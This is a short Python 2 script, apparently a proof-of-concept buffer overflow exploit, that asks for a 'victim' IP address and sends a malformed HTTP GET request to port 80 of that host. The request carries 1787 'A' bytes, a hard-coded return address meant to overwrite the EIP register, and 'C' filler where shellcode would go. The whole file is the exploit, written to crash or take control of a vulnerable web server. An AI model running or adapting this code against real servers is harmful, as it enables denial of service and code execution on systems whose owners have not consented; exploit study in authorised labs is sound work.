import socket
import sys


ip = raw_input("Enter targets' IP :- ")  # getting victims' IP as user input

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

while True:
    if (ip == ""):
        ip = raw_input("Please enter targets' IP :- ")
    else : break

port = 80
''' because that web service runs on port 80, and we're sending http request 
to that port instead of sending it through a browser '''

s.connect((ip,port))

buff = "GET "  # because we're sending get request
eip = "\x53\x93\x42\x7e"
esp = "C" * (2000 -1787 -4)
buff += "A" * 1787 + eip + esp
buff += " HTTP/1.1\r\n\r\n" # protocol and the version
s.send(buff)
s.close()

